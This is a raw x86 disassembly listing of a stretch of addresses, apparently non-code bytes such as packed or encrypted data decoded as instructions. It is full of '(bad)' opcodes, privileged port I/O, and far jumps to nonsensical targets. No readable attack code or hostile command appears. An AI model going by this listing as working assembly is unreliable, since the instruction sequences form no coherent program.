  420b6e:	aad    0xfa
  420b70:	in     al,dx
  420b71:	clc    
  420b72:	cli    
  420b73:	jmp    0xd2210c44
  420b78:	mov    ah,0xd4
  420b7b:	pop    es
  420b7c:	or     ecx,DWORD PTR [ebx]
  420b7e:	jmp    0x420b8b
  420b80:	fcmovnb st,st(6)
  420b82:	call   0xc224ea59
  420b87:	repz out dx,eax
  420b89:	rol    bl,1
  420b8b:	into   
  420b8c:	mov    bl,0xe8
  420b8e:	shl    cl,1
  420b90:	(bad)
  420b93:	aam    0xed
  420b95:	f2xm1  
  420b97:	int3   
  420b98:	repz fcmovnbe st,st(4)
  420b9b:	(bad)  
  420b9c:	mul    al
  420b9e:	(bad)  
  420ba1:	pop    es
  420ba2:	enter  0xf209,0xea
  420ba6:	fmul   st(4),st
  420ba8:	fmul   st(7),st
  420baa:	ret    
  420bab:	fcmovnbe st,st(4)
  420bad:	fcmovu st,st(7)
  420baf:	fst    st(2)
  420bb1:	mov    ch,0xe9
  420bb3:	add    edi,DWORD PTR [edi-0x93e060d]
  420bb9:	shl    bl,1
  420bbb:	hlt    
  420bbc:	cli    
  420bbd:	sar    al,0xd
  420bc0:	cld    
  420bc1:	or     eax,0xc8c8cddf
  420bc6:	ret    
  420bc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420bc8:	mov    al,0xb2
  420bcb:	out    0xeb,eax
  420bcd:	in     al,dx
  420bce:	stc    
  420bcf:	mov    eax,0xd8dfccbf
  420bd4:	sar    al,1
  420bd6:	add    edi,DWORD PTR [ebp-0x22272120]
  420bdc:	mov    ch,0x9
  420bdf:	add    ecx,eax
  420be1:	(bad)  
  420be3:	leave  
  420be4:	out    0xaf,eax
  420be6:	ret    0xc9cd
  420be9:	jmp    0xf8bb:0xd0b1b2f3
  420bf0:	fst    st(4)
  420bf2:	(bad)  
  420bf4:	mov    bh,0xf1
  420bf6:	hlt    
  420bf7:	(bad)  
  420bf8:	loope  0x420bec
  420bfa:	(bad)
  420bfd:	aad    0xdf
  420bff:	out    0xb,al
  420c01:	in     eax,0x5
  420c03:	or     dl,dh
  420c05:	test   al,0xbf
  420c07:	retf   
  420c08:	repnz in eax,dx
  420c0a:	retf   
  420c0b:	stc    
  420c0c:	in     al,dx
  420c0d:	into   
  420c0e:	stc    
  420c0f:	mov    bh,0xc9
  420c11:	mov    edi,0xdeefd4d4
  420c16:	loop   0x420bf5
  420c18:	fild   WORD PTR [esi]
  420c1a:	fadd   st,st(7)
  420c1c:	rcr    ebp,0xee
  420c1f:	or     esi,esp
  420c21:	or     al,BYTE PTR [ecx]
  420c23:	add    dl,dh
  420c25:	lock mov bl,0xb2
  420c28:	mov    ch,0xc6
  420c2a:	cmc    
  420c2b:	into   
  420c2c:	out    dx,eax
  420c2d:	mov    ah,0xb9
  420c2f:	mov    dh,0xe8
  420c31:	dec    esi
  420c33:	std    
  420c34:	repz sar esi,cl
  420c37:	add    eax,0xe00bc1f1
  420c3c:	shl    esi,1
  420c3e:	retf   0xfcd5
  420c41:	loopne 0x420c0f
  420c43:	jmp    0xccec:0xc5d2d0e4
  420c4a:	loopne 0x420c3f
  420c4c:	mov    bh,0xf7
  420c4f:	mov    edi,0xcff0f3fd
  420c54:	mov    ebp,0xe7e3e1bf
  420c59:	(bad)  
  420c5a:	jmp    0xc804:0xb0fdfe3
  420c61:	stc    
  420c62:	sti    
  420c63:	int    0xcd
  420c65:	repnz mov esp,0xc5d3e2f3
  420c6b:	int    0xd2
  420c6d:	cmc    
  420c6e:	rcl    eax,1
  420c70:	fst    st(2)
  420c72:	ror    esi,cl
  420c74:	loope  0x420c62
  420c76:	in     eax,dx
  420c77:	fdivr  st(7),st
  420c79:	add    bl,bl
  420c7b:	rcl    cl,0xdf
  420c7e:	mov    edi,0xc0c8f9e4
  420c84:	jmp    0xc629f254
  420c89:	mov    al,0xee
  420c8b:	fldl2e 
  420c8d:	in     eax,dx
  420c8e:	out    0xd4,al
  420c90:	aad    0xca
  420c92:	(bad)  
  420c93:	mov    ah,0xd2
  420c95:	mov    ebp,0xbed6dfdd
  420c9a:	mov    esp,0x9fbe6d4
  420c9f:	enter  0x207,0xcc
  420ca3:	jmp    0x420c5e
  420ca5:	shl    ecx,cl
  420ca7:	(bad)  
  420ca8:	icebp  
  420ca9:	repz call 0xd241ff76
  420caf:	fcmovnu st,st(4)
  420cb1:	icebp  
  420cb2:	mov    edi,0xd2d0e3d3
  420cb7:	(bad)  
  420cb8:	mov    edi,0xdfd4d8d8
  420cbd:	retf   0xffd
  420cc0:	loope  0x420cb1
  420cc2:	push   es
  420cc3:	out    dx,eax
  420cc4:	fsubr  st(2),st
  420cc6:	shl    esp,0xcf
  420cc9:	in     al,0xcd
  420ccb:	repz out dx,al
  420ccd:	lock mov al,0xf5
  420cd0:	fdivp  st(1),st
  420cd2:	repnz retf 0x7fe
  420cd6:	(bad)  
  420cd7:	loopne 0x420c9c
  420cd9:	div    ebp
  420cdb:	fsubr  st(5),st
  420cdd:	enter  0xdec7,0xe8
  420ce1:	loop   0x420ca8
  420ce3:	pop    es
  420ce4:	int3   
  420ce5:	mov    bl,0xf6
  420ce7:	int    0xc6
  420ce9:	shr    ecx,cl
  420ceb:	(bad)  
  420ced:	leave  
  420cee:	stc    
  420cef:	hlt    
  420cf0:	(bad)  
  420cf2:	push   ebp
  420cf4:	in     eax,dx
  420cf5:	ret    0xd0bf
  420cf8:	out    0xc4,al
  420cfa:	icebp  
  420cfb:	add    ebx,ecx
  420cfd:	mov    esi,0xebfdcaf6
  420d02:	in     al,dx
  420d03:	enter  0xe3e0,0xc8
  420d07:	(bad)  
  420d08:	lock into 
  420d0a:	in     al,0xca
  420d0c:	lock call 0xfe10cbdc
  420d12:	call   eax
  420d14:	icebp  
  420d15:	lock int3 
  420d17:	in     al,dx
  420d18:	pop    es
  420d19:	(bad)
  420d1d:	loope  0x420d22
  420d1f:	mov    esp,0xd3c5e40f
  420d24:	lods   eax,DWORD PTR ds:[esi]
  420d25:	jmp    0xed02f9f3
  420d2a:	retf   
  420d2b:	shl    edi,cl
  420d2d:	out    0xb5,al
  420d2f:	fmulp  st(7),st
  420d31:	clc    
  420d32:	cld    
  420d33:	loope  0x420cf3
  420d35:	ret    
  420d36:	out    0xec,eax
  420d38:	clc    
  420d39:	lds    ecx,FWORD PTR [edx]
  420d3b:	or     al,BYTE PTR ds:0xc7e1e8f6
  420d41:	aam    0x0
  420d43:	loop   0x420d0e
  420d45:	loope  0x420cf6
  420d47:	out    0xcb,al
  420d49:	mov    ah,0xd6
  420d4b:	(bad)  
  420d4d:	rol    esi,cl
  420d4f:	out    0xca,al
  420d51:	enter  0xeffe,0xcd
  420d55:	inc    DWORD PTR [edx]
  420d57:	rcl    ebp,0x7
  420d5a:	in     eax,0xc1
  420d5c:	pop    es
  420d5d:	sti    
  420d5e:	or     al,cl
  420d60:	retf   
  420d61:	ret    0xcd0f
  420d64:	(bad)
  420d67:	scas   al,BYTE PTR es:[edi]
  420d68:	repnz loope 0x420d35
  420d6b:	sti    
  420d6c:	repz out dx,eax
  420d6e:	(bad)  
  420d6f:	(bad)  
  420d70:	in     al,dx
  420d71:	jmp    0x420d3e
  420d73:	jecxz  0x420d6c
  420d75:	out    dx,al
  420d76:	repnz aad 0xc3
  420d79:	(bad)  
  420d7b:	(bad)  
  420d7d:	loope  0x420d5f
  420d7f:	les    eax,FWORD PTR [ebx]
  420d81:	add    ch,al
  420d83:	icebp  
  420d84:	in     al,dx
  420d85:	icebp  
  420d86:	loop   0x420d48
  420d88:	mov    cl,0xb1
  420d8a:	retf   
  420d8b:	mov    bh,0xd7
  420d8d:	div    cl
  420d8f:	(bad)  
  420d90:	into   
  420d91:	int    0xba
  420d93:	enter  0xb8ef,0x6
  420d97:	mov    ah,0xdf
  420d99:	in     al,0xd0
  420d9b:	loopne 0x420d99
  420d9d:	idiv   bl
  420d9f:	or     eax,0xcce4c5e1
  420da4:	int    0xee
  420da6:	call   0xc1f6eb90
  420dab:	out    dx,eax
  420dac:	clc    
  420dad:	ffreep st(6)
  420daf:	mov    edx,0xe3bad4d1
  420db4:	mov    eax,0xc6c0dbbc
  420db9:	std    
  420dba:	fsubr  st(2),st
  420dbc:	fiadd  WORD PTR [edx]
  420dbe:	clc    
  420dbf:	loope  0x420da5
  420dc1:	or     ebp,esp
  420dc3:	bnd call 0xae2ceead
  420dc9:	iret   
  420dca:	jmp    0xeeed:0xc7b2d3b0
  420dd1:	add    ebp,ecx
  420dd3:	sti    
  420dd4:	fstp   TBYTE PTR [ebp-0x2440fcfa]
  420dda:	div    bh
  420ddc:	loope  0x420de6
  420dde:	(bad)  
  420ddf:	(bad)  
  420de0:	loop   0x420dac
  420de2:	add    edx,edi
  420de4:	test   eax,0xf1f0bcd1
  420de9:	aad    0xeb
  420deb:	les    esi,FWORD PTR [edi-0x24412c0d]
  420df1:	hlt    
  420df2:	mov    ebx,0xe1e102dc
  420df7:	xlat   BYTE PTR ds:[ebx]
  420df8:	add    ebp,edx
  420dfa:	jmp    0x420df4
  420dfc:	add    al,0x9
  420dfe:	(bad)  
  420dff:	retf   
  420e00:	add    eax,0xbde3c8e7
  420e05:	fsubp  st(3),st
  420e07:	out    dx,eax
  420e08:	mov    dh,0xe4
  420e0a:	mov    bl,0xf4
  420e0c:	(bad)  
  420e0d:	rcl    esp,cl
  420e0f:	retf   
  420e10:	mov    edi,0xe9bbcfb9
  420e15:	aad    0xf6
  420e17:	add    eax,0xbcf5bae7
  420e1c:	push   es
  420e1d:	xlat   BYTE PTR ds:[ebx]
  420e1e:	retf   0xe8da
  420e21:	or     eax,0xddbc04d8
  420e26:	lock mov esi,0xe8c0f2e0
  420e2c:	(bad)  
  420e2d:	imul   al
  420e2f:	fdecstp 
  420e31:	fistp  QWORD PTR [eax-0x33130932]
  420e37:	mov    edi,0xf10702f0
  420e3c:	fxtract 
  420e3e:	out    dx,eax
  420e3f:	(bad)  
  420e41:	loope  0x420e20
  420e43:	cld    
  420e44:	jmp    0xbe19bbf2
  420e49:	mov    dh,0xb6
  420e4b:	aam    0xd6
  420e4d:	retf   
  420e4e:	fidivr WORD PTR [edx-0xb4b2b22]
  420e54:	clc    
  420e55:	pop    es
  420e56:	out    0xf9,al
  420e58:	sar    bl,cl
  420e5a:	add    dh,ah
  420e5c:	in     eax,0x1
  420e5e:	paddq  mm0,mm4
  420e61:	jecxz  0x420e70
  420e63:	pop    es
  420e64:	icebp  
  420e65:	in     al,0xb7
  420e67:	in     al,0xd2
  420e69:	scas   al,BYTE PTR es:[edi]
  420e6a:	in     al,dx
  420e6b:	xlat   BYTE PTR ds:[ebx]
  420e6c:	mov    edx,0xf2c5c7b6
  420e71:	shl    ebx,1
  420e73:	ret    
  420e74:	hlt    
  420e75:	loop   0x420e38
  420e77:	xlat   BYTE PTR ds:[ebx]
  420e78:	cld    
  420e79:	pop    es
  420e7a:	hlt    
  420e7b:	retf   0x303
  420e7e:	(bad)
  420e81:	fucomip st,st(2)
  420e83:	add    ebp,DWORD PTR [edi-0x304c1d31]
  420e89:	mul    al
  420e8b:	shl    BYTE PTR [esi-0x4733150e],1
  420e91:	sti    
  420e92:	fdivr  st(5),st
  420e94:	(bad)  
  420e95:	mov    esp,0xd2d5f5c1
  420e9a:	xlat   BYTE PTR ds:[ebx]
  420e9b:	clc    
  420e9c:	loop   0x420e65
  420e9e:	enter  0xf,0xeb
  420ea2:	leave  
  420ea3:	in     eax,0xd8
  420ea5:	repz out dx,al
  420ea7:	in     eax,dx
  420ea8:	out    0xf7,eax
  420eaa:	retf   0xd9d2
  420ead:	cli    
  420eae:	hlt    
  420eaf:	hlt    
  420eb0:	iret   
  420eb1:	aad    0x3
  420eb3:	shl    ebp,1
  420eb5:	add    bl,bh
  420eb7:	mov    edi,0xeae6d2bf
  420ebc:	cld    
  420ebd:	test   al,0xd6
  420ec0:	in     eax,0x6
  420ec2:	or     ecx,DWORD PTR [eax]
  420ec4:	fchs   
  420ec6:	in     al,dx
  420ec7:	in     eax,0xc9
  420ec9:	xlat   BYTE PTR ds:[ebx]
  420eca:	mov    ebx,0xebd6cae2
  420ecf:	mov    ebx,0xd1dbddf0
  420ed4:	cmc    
  420ed5:	loopne 0x420ea3
  420ed7:	stc    
  420ed8:	in     al,0xf0
  420eda:	shl    eax,0xe7
  420edd:	cmc    
  420ede:	out    0xfc,eax
  420ee0:	in     eax,0xd
  420ee2:	or     al,0x8
  420ee4:	in     eax,0xd8
  420ee6:	in     al,0xe6
  420ee8:	hlt    
  420ee9:	mov    ah,0xb6
  420eeb:	iret   
  420eec:	mov    bl,0xc8
  420eee:	out    dx,eax
  420eef:	mov    bh,0xb7
  420ef1:	in     al,dx
  420ef2:	ret    
  420ef3:	mov    esp,0x1d8dade
  420ef8:	(bad)  
  420efa:	hlt    
  420efb:	lock loop 0x420eda
  420efe:	fucom  st(6)
  420f00:	cli    
  420f01:	(bad)  
  420f02:	(bad)
  420f07:	out    dx,eax
  420f08:	shl    ah,1
  420f0a:	(bad)  
  420f0b:	iret   
  420f0c:	mov    edx,0xbef0c9c5
  420f11:	out    dx,al
  420f12:	retf   0xbbb8
  420f15:	repnz cli 
  420f17:	(bad)  
  420f18:	out    0xe0,al
  420f1a:	aam    0xd8
  420f1c:	aam    0xc1
  420f1e:	dec    DWORD PTR [ebx]
  420f20:	add    eax,ebp
  420f22:	add    esp,ecx
  420f24:	retf   
  420f25:	shl    ah,cl
  420f27:	in     al,dx
  420f28:	call   0xb722d6ef
  420f2d:	aam    0xbf
  420f2f:	shl    BYTE PTR [esi+edi*4-0x700430e],1
  420f36:	sar    DWORD PTR [esi-0x3e282429],0xb
  420f3d:	jecxz  0x420f0a
  420f3f:	in     al,0xdf
  420f41:	in     al,0xda
  420f43:	loop   0x420f02
  420f45:	jmp    0xb4b3:0xb3f3f3ca
  420f4c:	mov    dl,0xc8
  420f4e:	aad    0xcd
  420f50:	mov    edi,0xe1d4d0d8
  420f55:	in     eax,dx
  420f56:	out    0xb4,al
  420f58:	fcomp  st(4)
  420f5a:	repz std 
  420f5c:	lock call 0xe3490771
  420f62:	les    eax,FWORD PTR [eax]
  420f64:	lods   eax,DWORD PTR ds:[esi]
  420f65:	out    dx,eax
  420f66:	ffreep st(1)
  420f68:	mov    dh,0xe4
  420f6a:	out    0xf2,eax
  420f6c:	repz aam 0xc7
  420f6f:	int3   
  420f70:	mov    bh,0xdd
  420f72:	(bad)  
  420f73:	sti    
  420f74:	mov    bh,0xef
  420f76:	icebp  
  420f77:	add    bh,BYTE PTR [ebx-0x609f93d]
  420f7d:	mov    esi,0xf3fce9f4
  420f82:	fcmovnu st,st(5)
  420f84:	ror    dl,cl
  420f86:	fsubr  st(6),st
  420f88:	aad    0xdc
  420f8a:	into   
  420f8b:	jmp    0xf2bd:0xcffaccea
  420f92:	int    0xf0
  420f94:	repz loopne 0x420f50
  420f97:	in     eax,0xdc
  420f99:	icebp  
  420f9a:	(bad)  
  420f9b:	(bad)  
  420f9c:	cli    
  420f9d:	call   0xfc51da80
  420fa2:	loope  0x420f93
  420fa4:	retf   
  420fa5:	repz fucom st(1)
  420fa8:	hlt    
  420fa9:	fdiv   QWORD PTR [edx-0x4b0e183a]
  420faf:	mov    edx,0xc2fcb2b8
  420fb4:	mov    edx,0xd7b400d4
  420fb9:	rol    BYTE PTR [eax+edi*4],0x1
  420fbd:	loopne 0x420f85
  420fbf:	mov    bh,0xe3
  420fc2:	out    0xef,eax
  420fc4:	jmp    0x420f84
  420fc6:	not    edi
  420fc8:	fadd   st(7),st
  420fca:	fcmovbe st,st(2)
  420fcc:	(bad)  
  420fcd:	not    ah
  420fcf:	retf   0xdfb8
  420fd2:	mov    ecx,0xf0c3d8b0
  420fd7:	ret    0xccf5
  420fda:	cli    
  420fdb:	ret    
  420fdc:	(bad)  
  420fdd:	cld    
  420fde:	(bad)  
  420fdf:	in     eax,dx
  420fe0:	jmp    0x420fc5
  420fe2:	fstp   st(7)
  420fe4:	mov    esi,0xe6b7a9b2
  420fe9:	loop   0x420fbf
  420feb:	in     al,0xf0
  420fed:	mov    bh,0xeb
  420fef:	out    0xb4,al
  420ff1:	(bad)  
  420ff3:	enter  0xbdb8,0xf8
  420ff7:	fadd   DWORD PTR [edi]
  420ff9:	mov    esp,0xdcd10105
  420ffe:	out    0xdd,eax
  421000:	into   
  421001:	add    ebp,ebp
  421003:	retf   
  421004:	ret    
  421005:	mov    dl,0xc1
  421007:	ret    
  421008:	(bad)  
  421009:	jmp    0x420fdb
  42100b:	(bad)  
  42100c:	in     eax,0xf4
  42100e:	into   
  42100f:	clc    
  421010:	leave  
  421011:	out    dx,al
  421012:	int3   
  421013:	fdivr  QWORD PTR [ebp-0x2001238]
  421019:	sti    
  42101a:	(bad)  
  42101c:	ret    
  42101d:	add    eax,0xcfeadac5
  421022:	fcmovu st,st(1)
  421024:	mov    bl,0xae
  421026:	ret    
  421027:	repnz vpor xmm6,xmm1,XMMWORD PTR [eax-0x9014637]
  421030:	aad    0xd1
  421032:	mov    ah,0xf1
  421034:	aad    0xcc
  421036:	cmc    
  421037:	std    
  421038:	fsin   
  42103a:	add    al,0xdb
  42103c:	add    cl,ch
  42103e:	or     BYTE PTR [esi],cl
  421040:	(bad)  
  421043:	loop   0x42102e
  421045:	int3   
  421046:	(bad)  
  421047:	jecxz  0x42101a
  421049:	in     eax,0xeb
  42104b:	mov    bl,0xe6
  42104d:	repnz in eax,dx
  42104f:	mov    ebx,0xb9f6ebe5
  421054:	(bad)  
  421055:	clc    
  421056:	cmc    
  421057:	in     eax,0xed
  421059:	or     esi,edx
  42105b:	ret    
  42105c:	fiadd  WORD PTR [edx]
  42105e:	call   0xf43af62d
  421063:	call   0xa91fc414
  421068:	jmp    0xcd0dd744
  42106d:	repz out dx,eax
  42106f:	aad    0xcc
  421071:	int    0xbc
  421073:	int3   
  421074:	sar    esi,1
  421076:	jmp    ebx
  421078:	fcmovnu st,st(3)
  42107a:	or     eax,eax
  42107c:	mov    BYTE PTR [ebx],0xe5
  42107f:	fsubr  st(2),st
  421081:	inc    BYTE PTR [edx]
  421083:	into   
  421084:	shl    BYTE PTR [ecx-0x4c1e5037],cl
  42108a:	jecxz  0x421078
  42108c:	out    0xe6,al
  42108e:	call   0xc913cf62
  421093:	ret    0xd002
  421096:	mov    esp,0xc5e705be
  42109b:	ret    
  42109c:	cld    
  42109d:	jmp    0xe113:0xcee303c1
  4210a4:	fdivr  st(0),st
  4210a6:	rcl    cl,0xee
  4210a9:	in     eax,dx
  4210aa:	(bad)  
  4210ab:	int3   
  4210ac:	fnstenv [ecx-0x22f090d]
  4210b2:	fcmovbe st,st(1)
  4210b4:	aad    0xcd
  4210b6:	repz mov edi,0xbcc205de
  4210bc:	add    eax,0xf8fec0e1
  4210c1:	retf   
  4210c2:	(bad)  
  4210c4:	mov    esi,0xe6e9dcdc
  4210c9:	mov    dl,0xd0
  4210cb:	out    0xe0,al
  4210cd:	out    0xe5,al
  4210cf:	aam    0xdf
  4210d1:	repnz fcmovu st,st(5)
  4210d4:	mov    esp,0xf4fbd007
  4210d9:	mov    ebp,0xc9c2c1fc
  4210de:	in     eax,0xc8
  4210e0:	fimul  WORD PTR [ecx]
  4210e2:	std    
  4210e3:	out    0xc4,eax
  4210e5:	out    dx,eax
  4210e6:	repnz cmc 
  4210e8:	(bad)  
  4210e9:	in     eax,0xf6
  4210eb:	ret    0xe4d6
  4210ee:	fcmovbe st,st(6)
  4210f0:	in     eax,0xfd
  4210f2:	int3   
  4210f3:	mov    ebp,0xf4f8f5c2
  4210f8:	(bad)  
  4210fa:	xlat   BYTE PTR ds:[ebx]
  4210fb:	ret    
  4210fc:	(bad)  
  4210fd:	call   0xff451be7
  421102:	(bad)  
  421103:	repnz loopne 0x4210f8
  421106:	div    ebp
  421108:	in     eax,dx
  421109:	loopne 0x4210b8
  42110b:	fsincos 
  42110d:	(bad)  
  42110e:	(bad)  
  421110:	sar    esi,cl
  421112:	call   esi
  421114:	mov    ebx,0xecc3d1f4
  421119:	rcr    ah,0xdb
  42111c:	frstpm(287 only) 
  42111e:	stc    
  42111f:	hlt    
  421120:	jecxz  0x42111a
  421122:	std    
  421123:	rcl    ecx,cl
  421125:	imul   DWORD PTR [ecx-0x300f1139]
  42112b:	(bad)  
  42112c:	mov    ah,0xcc
  42112e:	fcmove st,st(6)
  421130:	xlat   BYTE PTR ds:[ebx]
  421131:	sar    ch,1
  421133:	jmp    0x7dd:0xfacff800
  42113a:	cli    
  42113b:	fadd   DWORD PTR [edx]
  42113d:	cmc    
  42113e:	(bad)  
  42113f:	jmp    edi
  421141:	fmul   DWORD PTR [eax]
  421143:	adc    ch,bh
  421145:	into   
  421146:	in     eax,0xce
  421148:	into   
  421149:	rcl    ebp,1
  42114b:	mov    ch,0xd7
  42114d:	shl    bl,1
  42114f:	fyl2xp1 
  421151:	neg    eax
  421153:	imul   al
  421155:	not    edi
  421157:	in     eax,dx
  421158:	repz fdivr st,st(4)
  42115b:	fsubr  st,st(2)
  42115d:	add    bh,bl
  42115f:	in     eax,0xd9
  421161:	in     al,dx
  421162:	into   
  421163:	add    eax,ebx
  421165:	ret    0xc7ae
  421168:	iret   
  421169:	fsubr  st(1),st
  42116b:	into   
  42116c:	int3   
  42116d:	mov    ecx,0xcbfdd6cd
  421172:	call   0xd03ef36b
  421177:	int    0xf7
  421179:	clc    
  42117a:	fcmovnb st,st(4)
  42117c:	(bad)  
  42117d:	fmul   st,st(3)
  42117f:	iret   
  421180:	push   es
  421181:	push   cs
  421182:	inc    BYTE PTR [ecx]
  421184:	mov    ecx,0xb1d3a9d8
  421189:	icebp  
  42118a:	int3   
  42118b:	out    0xe1,eax
  42118d:	in     al,0xc8
  42118f:	mov    eax,0xd1f5f5ed
  421194:	mov    ebx,0xbee1d4bd
  421199:	rcr    al,0x0
  42119c:	std    
  42119d:	aam    0xee
  42119f:	jmp    0xd4dd6b2
  4211a4:	shl    ecx,cl
  4211a6:	lods   eax,DWORD PTR ds:[esi]
  4211a7:	jmp    0xe9f4:0xacf1e7cd
  4211ae:	in     eax,0xdd
  4211b0:	fnsave [ebp+0xb8f9e9]
  4211b6:	lock clc 
  4211b8:	rol    DWORD PTR [eax],0xea
  4211bb:	lock add eax,0xc8c708e4
  4211c1:	hlt    
  4211c2:	(bad)  
  4211c4:	out    0xcd,eax
  4211c6:	fdiv   QWORD PTR [ebx-0x262d1635]
  4211cc:	mov    al,0xe9
  4211ce:	retf   0xf7b7
  4211d1:	in     al,dx
  4211d2:	hlt    
  4211d3:	sti    
  4211d4:	call   0x40f0eb4
  4211d9:	add    ecx,edi
  4211db:	fcom   st(0)
  4211dd:	add    eax,0xfbdb0aef
  4211e2:	add    al,0x6
  4211e4:	iret   
  4211e5:	scas   eax,DWORD PTR es:[edi]
  4211e6:	retf   0xc5ed
  4211e9:	in     al,0xc9
  4211eb:	retf   0xf3f4
  4211ee:	sti    
  4211ef:	fdivr  st,st(4)
  4211f1:	fcmovne st,st(3)
  4211f3:	int    0xed
  4211f5:	ret    
  4211f6:	rol    DWORD PTR [eax],0x3
  4211f9:	in     eax,0xda
  4211fb:	or     al,dl
  4211fd:	rol    DWORD PTR [esi+ebx*8],0x8
  421201:	or     cl,bl
  421203:	or     bh,cl
  421205:	les    ebp,FWORD PTR [ecx-0x52244c0e]
  42120b:	mov    al,0xee
  42120d:	mov    bh,0xee
  42120f:	mov    edi,0xdbbccdbb
  421214:	lock int 0xbc
  421217:	out    0xfb,al
  421219:	loope  0x421210
  42121b:	add    eax,0xfedeffd1
  421220:	loope  0x42120f
  421222:	add    DWORD PTR [edx],ecx
  421224:	fld    st(0)
  421226:	call   0xe511cf07
  42122b:	test   esp,0xeef0fff7
  421231:	mov    edx,0xbcfaf9b8
  421236:	add    edi,DWORD PTR [eax-0x2f2a4509]
  42123c:	add    eax,0xeae604fa
  421241:	pop    es
  421242:	out    0xea,al
  421244:	jmp    0x421228
  421246:	int    0xc8
  421248:	retf   
  421249:	iret   
  42124a:	jecxz  0x42123c
  42124c:	jmp    0x421202
  42124e:	retf   
  42124f:	mov    ch,0xcd
  421251:	(bad)  
  421253:	mov    edx,0xfde7f103
  421258:	(bad)  
  42125a:	std    
  42125b:	shr    eax,0xdf
  42125e:	cmc    
  42125f:	(bad)  
  421260:	fsubrp st(6),st
  421262:	ror    edi,cl
  421264:	mov    esi,0xc2f3f3b3
  421269:	in     eax,dx
  42126a:	loop   0x421254
  42126c:	out    0xcf,eax
  42126e:	mov    cl,0xd1
  421270:	mov    bl,0xb2
  421272:	fucomip st,st(1)
  421274:	enter  0xd0d0,0xd2
  421278:	(bad)  
  421279:	imul   edx
  42127b:	(bad)  
  42127d:	(bad)  
  42127e:	std    
  42127f:	out    0xed,eax
  421281:	std    
  421282:	std    
  421283:	repz ret 
  421285:	retf   0xc2e7
  421288:	mov    ebp,0xccb4fbf0
  42128d:	int3   
  42128e:	(bad)  
  42128f:	shl    DWORD PTR [edi-0x48450a0e],cl
  421295:	(bad)  
  421297:	lock add al,al
  42129a:	push   es
  42129b:	lock retf 
  42129d:	fiadd  DWORD PTR [ebp*8-0x1d3b20f6]
  4212a4:	stos   BYTE PTR es:[edi],al
  4212a5:	shl    dh,0xef
  4212a8:	call   0xd93cd3a4
  4212ad:	(bad)  
  4212ae:	fcmovbe st,st(1)
  4212b0:	rcr    ebp,cl
  4212b2:	out    dx,al
  4212b3:	out    dx,al
  4212b4:	mov    edi,0xfcf2f407
  4212b9:	add    ecx,eax
  4212bb:	mov    eax,0x9c70bc3
  4212c0:	retf   
  4212c1:	retf   
  4212c2:	fnstsw ax
  4212c4:	fdivr  QWORD PTR [edi+esi*8-0x3b2a2a43]
  4212cb:	out    0xca,al
  4212cd:	fcmovnu st,st(1)
  4212cf:	mov    ecx,0xbcc9e3ca
  4212d4:	out    dx,eax
  4212d5:	fdiv   st,st(5)
  4212d7:	fnstsw WORD PTR [edi-0x7232026]
  4212dd:	clc    
  4212de:	sti    
  4212df:	or     ah,bh
  4212e1:	loop   0x4212c7
  4212e3:	adc    ecx,edx
  4212e5:	loop   0x4212b4
  4212e7:	mov    cl,0xf0
  4212e9:	mov    bl,0xd0
  4212eb:	sti    
  4212ec:	repnz (bad) 
  4212ef:	(bad)  
  4212f1:	mov    ch,0xee
  4212f3:	icebp  
  4212f4:	enter  0xfbcf,0xfa
  4212f8:	repnz cld 
  4212fa:	mov    esp,0xfc04d9d4
  4212ff:	or     al,dh
  421301:	out    0xe5,eax
  421303:	(bad)  
  421305:	mov    edi,0xf6f1c5e7
  42130a:	loope  0x4212cc
  42130c:	scas   eax,DWORD PTR es:[edi]
  42130d:	mov    ah,0xb0
  42130f:	shl    ebx,1
  421311:	aad    0xb5
  421313:	in     eax,dx
  421314:	in     al,dx
  421315:	add    edx,ebx
  421317:	(bad)  
  421318:	fdivr  st(0),st
  42131a:	repnz fadd QWORD PTR [ecx]
  42131d:	out    dx,eax
  42131e:	or     esp,ecx
  421320:	pop    es
  421321:	retf   
  421322:	or     eax,0xeea8cbf2
  421327:	in     eax,0xe3
  421329:	(bad)  
  42132a:	cmc    
  42132b:	lock shl ah,0xd2
  42132f:	repz std 
  421331:	aad    0xc3
  421333:	rol    DWORD PTR [ecx],cl
  421335:	std    
  421336:	sar    al,0xe5
  421339:	out    0xfa,eax
  42133b:	ret    
  42133c:	mov    edi,0xc6ddf7d5
  421341:	in     eax,0xe
  421343:	push   es
  421344:	into   
  421345:	loop   0x42132c
  421347:	int3   
  421348:	mov    bh,0xe5
  42134a:	mov    ch,0xb2
  42134c:	fucomi st,st(0)
  42134e:	(bad)  
  42134f:	in     eax,0xfe
  421351:	retf   
  421352:	cld    
  421353:	lock clc 
  421355:	mov    edx,0xc5d3e7d9
  42135a:	les    eax,FWORD PTR [esi]
  42135c:	hlt    
  42135d:	ret    0x9c6
  421360:	fld    st(2)
  421362:	fsubr  st(5),st
  421364:	fst    st(0)
  421366:	mov    esp,0xa9c0edf2
  42136b:	jmp    0x421322
  42136d:	jmp    0xb8da:0xb5ccd0eb
  421374:	mov    edi,0xdaedc2df
  421379:	loopne 0x42133d
  42137b:	(bad)  
  42137d:	fild   DWORD PTR [edx]
  42137f:	cli    
  421380:	ret    
  421381:	fisttp DWORD PTR [esi]
  421383:	add    eax,0xe5bce9bf
  421388:	out    dx,al
  421389:	jmp    0x421361
  42138b:	int    0xe7
  42138d:	mov    ecx,0xf0d4f8f7
  421392:	repz idiv dh
  421395:	shl    dl,0xd0
  421398:	in     eax,0xe1
  42139a:	fucom  st(3)
  42139c:	jmp    0xf6370d80
  4213a1:	cli    
  4213a2:	jmp    0xbd12c772
  4213a7:	lock lock ror ch,1
  4213ab:	xlat   BYTE PTR ds:[ebx]
  4213ac:	leave  
  4213ad:	repnz mov eax,0xdbb5c4d1
  4213b3:	fsub   st(6),st
  4213b5:	clc    
  4213b6:	fstp   TBYTE PTR [esi-0xa2d3900]
  4213bc:	in     al,0xc9
  4213be:	iret   
  4213bf:	jecxz  0x42138a
  4213c1:	repz adc ah,bl
  4213c4:	call   0xaf0bffbb
  4213c9:	out    0xb2,eax
  4213cb:	out    dx,eax
  4213cc:	mov    bh,0xd9
  4213ce:	(bad)  
  4213cf:	jmp    0x4213a1
  4213d1:	mov    dh,0xf2
  4213d3:	test   edi,0xfd03fab8
  4213d9:	(bad)
  4213dc:	lock loop 0x4213d4
  4213df:	out    dx,eax
  4213e0:	fxch   st(0)
  4213e2:	inc    BYTE PTR ds:0xd3eecbb1
  4213e8:	ret    
  4213e9:	mov    dh,0xb6
  4213eb:	in     al,dx
  4213ec:	mov    ch,0xe6
  4213ee:	jmp    0x4213aa
  4213f0:	(bad)  
